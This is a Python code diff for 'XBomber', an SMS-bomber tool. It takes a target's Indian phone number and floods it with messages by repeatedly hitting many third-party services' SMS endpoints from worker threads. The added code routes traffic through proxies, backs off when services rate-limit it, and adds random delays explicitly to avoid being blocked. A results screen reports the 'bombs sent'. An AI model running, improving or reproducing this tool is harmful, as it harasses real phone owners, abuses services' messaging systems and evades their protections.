-# ─── Screens ─────────────────────────────────────────────────────────────────
-def screen_start_bombing() -> None:
-    console.print(Rule("[info]Start Bombing[/info]", style="cyan"))
-
-    phone = Prompt.ask("[success]Victim's 10-digit phone (without +91)[/success]")
-    if not (phone.isdigit() and len(phone) == 10):
-        console.print("[error]Invalid number. Must be exactly 10 digits.[/error]")
-        wait_for_enter()
-        return
-
-    try:
-        total = int(Prompt.ask("[success]Number of SMS to send[/success]", default="100"))
-        assert 1 <= total <= MAX_SMS
-    except (ValueError, AssertionError):
-        console.print(f"[error]Count must be between 1 and {MAX_SMS}.[/error]")
-        wait_for_enter()
-        return
-
-    thread_count = DEFAULT_THREADS
-    if Confirm.ask("[warning]Adjust thread count?[/warning]", default=False):
         try:
-            thread_count = int(Prompt.ask("Threads", default=str(DEFAULT_THREADS)))
-            thread_count = max(1, min(thread_count, 100))
-        except ValueError:
-            thread_count = DEFAULT_THREADS
+            if service['method'] == 'POST':
+                if isinstance(payload, str):
+                    resp = session.post(service['url'], headers=headers, data=payload, timeout=6, proxies=proxies)
+                else:
+                    resp = session.post(service['url'], headers=headers, json=payload, timeout=6, proxies=proxies)
+            else:
+                resp = session.get(service['url'], headers=headers, timeout=6, proxies=proxies)
 
-    console.print(
-        f"\n[warning]Bombing [bold]{phone}[/bold] with "
-        f"[bold]{total}[/bold] messages using "
-        f"[bold]{thread_count}[/bold] threads...[/warning]\n"
-    )
+            if resp.status_code in (429,403,401):
+                with self.rate_lock:
+                    self.rate_limited[service['name']] = time.time() + self.backoff
+                return False
+            return resp.status_code in (200,201,202,204)
+        except Exception:
+            return False
 
-    bomber = Bomber(phone=phone, total=total, thread_count=thread_count)
+    def worker(self, phone, phone91, phone_plus):
+        while self.running:
+            service = random.choice(self.services)
+            try:
+                if self.send_bomb(service, phone, phone91, phone_plus):
+                    with self.count_lock:
+                        self.success += 1
+            except:
+                pass
+            # Random delay + jitter to avoid being blocked
+            time.sleep(random.uniform(self.delay_min, self.delay_max))
 
-    with Progress(
-        SpinnerColumn(),
-        TextColumn("[progress.description]{task.description}"),
-        BarColumn(bar_width=40),
-        MofNCompleteColumn(),
-        TaskProgressColumn(),
-        TimeElapsedColumn(),
-        TimeRemainingColumn(),
-        console=console,
-        transient=False,
-    ) as progress:
-        task_id = progress.add_task("[cyan]Sending requests...", total=total)
-        report  = bomber.run(progress, task_id)
+    def start_attack(self, target):
+        self.running = True
+        self.success = 0
+        phone = target
+        phone91 = f"91{target}"
+        phone_plus = f"+91{target}"
+        start = time.time()
+        with ThreadPoolExecutor(max_workers=self.max_workers) as ex:
+            futures = [ex.submit(self.worker, phone, phone91, phone_plus) for _ in range(self.max_workers)]
+            # Animated progress bar (wave + moving bar)
+            try:
+                spinner = cycle(['◐','◓','◑','◒'])
+                bar_len = 30
+                last_count = 0
+                while self.running:
+                    # Dynamic progress bar that pulses based on count increments
+                    pct = (self.success % 100) / 100
+                    filled = int(bar_len * pct)
+                    bar = '█' * filled + '░' * (bar_len - filled)
+                    sys.stdout.write(f"\r{cyan('▶')} {green(next(spinner))} {magenta('💣')} {self.success} sent {cyan(bar)}")
+                    sys.stdout.flush()
+                    time.sleep(0.1)
+            except KeyboardInterrupt:
+                self.stop()
+            finally:
+                for f in futures:
+                    f.cancel()
+        elapsed = time.time() - start
+        return self.success, elapsed
 
-    print_report(report)
-    wait_for_enter()
+    def stop(self):
+        self.running = False
 
-
-def screen_protect_number() -> None:
-    console.print(Rule("[premium]Number Protection[/premium]", style="gold1"))
-    console.print(Panel.fit(
-        "[error]Number protection is only available in the PREMIUM script.[/error]\n"
-        "[muted]Contact the developer to get access.[/muted]",
-        title="[premium]Premium Feature[/premium]",
-        border_style="gold1",
-    ))
-    if Confirm.ask("[warning]Open Telegram to purchase premium?[/warning]", default=False):
-        open_url(PREMIUM_URL)
-        console.print("[success]Opening Telegram...[/success]")
-    else:
-        console.print("[muted]Returning to menu.[/muted]")
-
-    wait_for_enter()
-
-
-def screen_about() -> None:
-    console.print(Rule("[info]About[/info]", style="cyan"))
-    console.print(Panel(
-        f"[bold]XBomber v{VERSION}[/bold]\n\n"
-        f"Author   : [accent]{AUTHOR}[/accent]\n"
-        f"Telegram : [link={TELEGRAM}]{TELEGRAM}[/link]\n"
-        f"Config   : {CONFIG_PATH}\n"
-        f"Max SMS  : {MAX_SMS}\n"
-        f"Threads  : {DEFAULT_THREADS} (default)",
-        title="Tool Info",
-        border_style="cyan",
-    ))
-
-    # Show loaded services summary
-    try:
-        services = ConfigLoader.load()
-        svc_table = Table(border_style="dim", title=f"Loaded Services ({len(services)})")
-        svc_table.add_column("Name",    style="cyan")
-        svc_table.add_column("Method",  justify="center")
-        svc_table.add_column("Format")
-        for s in services:
-            svc_table.add_row(s.name, s.method, s.phone_format)
-        console.print(svc_table)
-    except SystemExit:
-        console.print("[error]Could not load services config.[/error]")
-
-    wait_for_enter()
-
-
-# ─── Main Menu ───────────────────────────────────────────────────────────────
-MENU_OPTIONS = {
-    "1": ("Start Bombing",      screen_start_bombing),
-    "2": ("Protect My Number",  screen_protect_number),
-    "3": ("About / Services",   screen_about),
-    "4": ("Exit",               None),
-}
-
-
-def menu() -> None:
+# ========================== UI FUNCTIONS ====================================
+def get_target():
     while True:
-        clear_screen()
-        render_banner()
+        num = input(green("\nEnter target number: ")).strip()
+        num = ''.join(filter(str.isdigit, num))
+        if len(num) == 10:
+            return num
+        elif len(num) == 12 and num.startswith('91'):
+            return num[2:]
+        else:
+            sys.stdout.write(red("\r[✗] Invalid! 10 digits required.\n"))
+            time.sleep(0.8)
 
-        console.print(Panel.fit("[warning]MAIN MENU[/warning]", border_style="yellow"))
-        for key, (label, _) in MENU_OPTIONS.items():
-            color = "red" if key == "4" else "cyan"
-            console.print(f"  [{color}]{key}.[/{color}] {label}")
+def configure_proxy(bomber):
+    choice = input(cyan("\n[?] Use HTTP proxies? (y/n): ")).strip().lower()
+    if choice in ('y','yes'):
+        bomber.proxy_manager.enable()
+        if not bomber.proxy_manager.proxies:
+            print(yellow("[!] No proxies loaded. Continuing without proxies."))
+            bomber.proxy_manager.disable()
+        else:
+            print(green(f"[✓] Proxies enabled ({len(bomber.proxy_manager.proxies)} loaded)."))
+    else:
+        bomber.proxy_manager.disable()
+        print(yellow("[!] Proxies disabled."))
+    time.sleep(1)
 
-        console.print()
-        choice = Prompt.ask(
-            "[info]Select option[/info]",
-            choices=list(MENU_OPTIONS.keys()),
-            show_choices=False,
-        )
+def start_bombing():
+    bomber = BomberCore()
+    configure_proxy(bomber)
+    target = get_target()
+    print(red(f"\n🎯 Target locked: {target}\n"))
+    print(yellow("▶  Bombing started (Ctrl+C to stop)\n"))
+    total, elapsed = bomber.start_attack(target)
+    print()  # newline after progress bar
+    # Detailed summary
+    mins, secs = divmod(int(elapsed), 60)
+    rate = total / elapsed if elapsed > 0 else 0
+    print(red("\n╔═══════════════════════════════════════════════════════════╗"))
+    print(bold("║                     B O M B   S U M M A R Y                     ║"))
+    print(red("╠═══════════════════════════════════════════════════════════╣"))
+    print(green(f"║  Target number    : {target:<45}║"))
+    print(green(f"║  Bombs sent       : {total:<45}║"))
+    print(green(f"║  Duration         : {mins}m {secs}s{' ' * (38 - len(str(mins)) - len(str(secs)))}║"))
+    print(green(f"║  Requests/second  : {rate:.1f}{' ' * (38 - len(str(round(rate,1))))}║"))
+    print(green(f"║  Active threads   : {bomber.max_workers:<45}║"))
+    print(green(f"║  Delay per request: {bomber.delay_min:.2f}–{bomber.delay_max:.2f}s{' ' * (27)}║"))
+    print(red("╚═══════════════════════════════════════════════════════════╝"))
+    input(yellow("\nPress Enter to return to menu..."))
 
-        label, handler = MENU_OPTIONS[choice]
-        if handler is None:
-            console.print("\n[error]Exiting XBomber. Goodbye.[/error]\n")
-            break
+def about():
+    services = load_services()
+    print(cyan("\n╔═══════════════════════════════════════════════════════════╗"))
+    print(cyan("║                        A B O U T                            ║"))
+    print(cyan("╠═══════════════════════════════════════════════════════════╣"))
+    print(f"║  Version       : {VERSION:<47}║")
+    print(f"║  Author        : Alienkrishn [Anon4You]                       ║")
+    print(f"║  Telegram      : https://t.me/nullxvoid                       ║")
+    print(f"║  Services      : {len(services)} APIs loaded from {SERVICES_FILE:<25}║")
+    print(f"║  Proxy support : Yes (proxies.txt)                            ║")
+    print(f"║  Rate limiting : Auto backoff (30s)                           ║")
+    print(f"║  Jitter        : {0.08}–{0.25}s random delay                   ║")
+    print(cyan("╚═══════════════════════════════════════════════════════════╝"))
+    input(yellow("\nPress Enter to return..."))
 
-        clear_screen()
-        handler()
+def main_menu():
+    while True:
+        banner()
+        print("  " + cyan("1.") + " Start Bombing")
+        print("  " + cyan("2.") + " About")
+        print("  " + cyan("3.") + " Exit")
+        print()
+        choice = input(green("Select option: ")).strip()
+        if choice == '1':
+            start_bombing()
+        elif choice == '2':
+            about()
+        elif choice == '3':
+            print(red("\nExiting XBomber. Goodbye.\n"))
+            sys.exit(0)
+        else:
+            print(red("Invalid option. Press Enter to continue."))
+            input()
 
-
-# ─── Entry Point ─────────────────────────────────────────────────────────────
-def main() -> None:
-    try:
-        menu()
-    except KeyboardInterrupt:
-        console.print("\n[error]Interrupted. Exiting...[/error]")
-        sys.exit(0)
-
-
-"""
-def validate_proxy(proxy):
-    try:
-        proxies = {
-            "http": proxy,
-            "https": proxy,
-        }
-
-        r = requests.get(
-            "https://httpbin.org/ip",
-            proxies=proxies,
-            timeout=8,
-            verify=True,
-        )
-
-        if r.status_code == 200:
-            print(f"[OK] {proxy}")
-            return True
-
-    except Exception as exc:
-        print(f"[BAD] {proxy} -> {exc}")
-
-    return False
-"""
-
+# ========================== ENTRY POINT =====================================
 if __name__ == "__main__":
-  main()
+    try:
+        main_menu()
+    except KeyboardInterrupt:
+        print(red("\n\nInterrupted. Exiting..."))
+        sys.exit(0)
